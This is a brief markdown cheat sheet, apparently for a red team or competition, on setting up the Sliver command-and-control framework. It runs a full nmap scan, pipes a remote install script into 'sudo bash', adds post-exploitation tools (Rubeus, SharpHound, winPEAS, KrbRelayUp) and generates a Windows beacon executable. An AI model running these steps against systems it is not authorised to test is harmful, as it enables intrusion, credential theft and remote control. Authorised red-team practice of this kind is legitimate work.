# Offensive script for teams 

nmap -Pn -sV -sC -O -p- [IP ADDRESS] -T4 --min-rate=10000 -oX scan.xml

# start sliver
curl https://sliver.sh/install|sudo bash
systemctl start sliver
./sliver-server


# get important scripts :3
armory install rubeus
armory install sharp-hound-3
armory install winpeas
armory install krbrelayup

# Creating a beacon on windows
generate -b localhost --os windows --arch x64 --format exe > beacon.exe

# start http server
http 
# get jobs
jobs

# get sessions
sessions


## Reference: https://sliver.sh/tutorials
